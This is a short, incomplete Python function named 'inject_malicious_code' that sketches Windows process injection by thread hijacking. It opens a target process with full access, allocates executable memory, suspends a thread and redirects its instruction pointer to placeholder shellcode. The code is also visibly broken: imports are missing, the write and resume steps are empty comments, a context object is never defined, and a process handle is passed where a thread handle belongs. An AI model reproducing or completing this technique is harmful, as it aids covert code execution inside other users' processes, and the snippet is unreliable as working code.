import os

def inject_malicious_code(target_pid):
    # Get handle to target process
    if platform.system() == 'Windows':
        kernel32 = ctypes.windll.kernel32
        PROCESS_ALL_ACCESS = 0x1F0FFF
        handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        
        # Allocate memory in target process
        shellcode = b'\x90\x90\x90'  # Example shellcode
        addr = kernel32.VirtualAllocEx(handle, 0, len(shellcode), 0x1000, 0x40)
        
        # Write shellcode to allocated memory

        # Get thread handle and suspend it
        thread_id = kernel32.GetThreadId(handle)
        thread_handle = kernel32.OpenThread(0x0002, False, thread_id)
        kernel32.SuspendThread(thread_handle)
        
        # Modify thread context to execute shellcode

        kernel32.GetThreadContext(thread_handle, ctypes.byref(context))
        context.Eip = addr
        kernel32.SetThreadContext(thread_handle, ctypes.byref(context))
        
        # Resume thread execution
